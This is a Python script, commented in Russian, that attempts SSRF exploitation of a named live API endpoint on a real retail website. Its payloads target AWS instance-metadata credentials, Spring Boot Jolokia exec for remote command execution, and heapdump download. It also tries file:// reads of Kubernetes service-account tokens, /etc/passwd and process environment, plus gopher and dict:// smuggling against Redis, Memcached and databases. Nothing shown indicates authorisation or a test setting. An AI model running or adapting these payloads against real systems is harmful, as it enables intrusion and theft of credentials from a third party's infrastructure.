#!/usr/bin/env python3
"""
Попытки РЕАЛЬНОЙ компрометации (не просто данные)
"""
import requests
import urllib3
urllib3.disable_warnings()

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

print("="*80)
print("ПОПЫТКИ РЕАЛЬНОЙ КОМПРОМЕТАЦИИ")
print("="*80)
print()

# =============================================================================
# ВЕКТОР 1: Использовать SSRF для получения AWS credentials
# =============================================================================

print("[ВЕКТОР 1] AWS Metadata - попытка получить credentials")
print("-"*80)

aws_endpoints = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/default",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
]

for url in aws_endpoints:
    print(f"[*] {url}")
    try:
        resp = requests.post(ENDPOINT, json={"url": url}, timeout=15, verify=False)
        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")
        if len(resp.text) > 10:
            print(f"    Body: {resp.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")
    print()

# =============================================================================
# ВЕКТОР 2: Actuator endpoints для RCE или credential leak
# =============================================================================

print("\n[ВЕКТОР 2] Spring Boot Actuator - попытки RCE")
print("-"*80)

# Jolokia может дать RCE
jolokia_rce = [
    "http://kubernetes.default.svc:8080/actuator/jolokia/exec/java.lang:type=Runtime/exec/id",
    "http://kubernetes.default.svc:8080/jolokia/exec/java.lang:type=Runtime/exec/whoami",
]

for url in jolokia_rce:
    print(f"[*] Jolokia RCE: {url}")
    try:
        resp = requests.post(ENDPOINT, json={"url": url}, timeout=15, verify=False)
        print(f"    Status: {resp.status_code}, Length: {len(resp.text)}")
        if len(resp.text) > 10:
            print(f"    Response: {resp.text}")
    except Exception as e:
        print(f"    Error: {e}")
    print()

# Heapdump может содержать credentials в памяти
print("[*] Trying heapdump (может содержать credentials в памяти)")
try:
    resp = requests.post(
        ENDPOINT,
        json={"url": "http://kubernetes.default.svc:8080/actuator/heapdump"},
        timeout=20,
        verify=False
    )
    print(f"    Status: {resp.status_code}")
    print(f"    Body length: {len(resp.text)} bytes")
    
    # Heapdump обычно большой файл
    if len(resp.text) > 1000:
        print(f"    ✅ HEAPDUMP ПОЛУЧЕН! Размер: {len(resp.text)} bytes")
        print(f"    Может содержать passwords, tokens, API keys в памяти")
        
        # Сохраним для анализа
        with open('heapdump.hprof', 'wb') as f:
            f.write(resp.content)
        print(f"    Сохранен в heapdump.hprof")
except Exception as e:
    print(f"    Error: {e}")

print()

# =============================================================================
# ВЕКТОР 3: Попробовать file:// protocol для чтения credentials
# =============================================================================

print("\n[ВЕКТОР 3] file:// protocol - попытка прямого чтения файлов")
print("-"*80)

# Может file:// вернет данные напрямую?
sensitive_files = [
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
    "file:///etc/passwd",
    "file:///proc/self/environ",
]

for url in sensitive_files:
    print(f"[*] {url}")
    try:
        resp = requests.post(ENDPOINT, json={"url": url}, timeout=15, verify=False)
        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")
        if len(resp.text) > 10:
            print(f"    ✅ ДАННЫЕ ПОЛУЧЕНЫ!")
            print(f"    Body: {resp.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")
    print()

# =============================================================================
# ВЕКТОР 4: Использовать gopher для protocol smuggling
# =============================================================================

print("\n[ВЕКТОР 4] Gopher protocol smuggling")
print("-"*80)

# Попробуем через gopher получить данные от Redis/Memcached
gopher_payloads = [
    # Redis KEYS command
    "gopher://kubernetes.default.svc:6379/_*1%0d%0a$4%0d%0aKEYS%0d%0a$1%0d%0a*%0d%0a",
    
    # Memcached stats
    "gopher://kubernetes.default.svc:11211/_stats%0d%0a",
]

for url in gopher_payloads:
    print(f"[*] {url[:60]}...")
    try:
        resp = requests.post(ENDPOINT, json={"url": url}, timeout=15, verify=False)
        print(f"    Status: {resp.status_code}, Length: {len(resp.text)}")
        if len(resp.text) > 10:
            print(f"    Response: {resp.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")
    print()

# =============================================================================
# ВЕКТОР 5: Попробовать dict:// protocol
# =============================================================================

print("\n[ВЕКТОР 5] dict:// protocol для port scanning и banner grabbing")
print("-"*80)

dict_urls = [
    "dict://kubernetes.default.svc:6379/info",
    "dict://kubernetes.default.svc:3306/info",
    "dict://kubernetes.default.svc:5432/info",
]

for url in dict_urls:
    print(f"[*] {url}")
    try:
        resp = requests.post(ENDPOINT, json={"url": url}, timeout=15, verify=False)
        print(f"    Status: {resp.status_code}, Length: {len(resp.text)}")
        if len(resp.text) > 10:
            print(f"    Response: {resp.text}")
    except Exception as e:
        print(f"    Error: {e}")
    print()

print("="*80)
print("ИТОГО")
print("="*80)
print()
print("Если хотя бы один вектор вернул данные > 10 bytes,")
print("то это РЕАЛЬНАЯ компрометация (не просто connectivity)!")
print()

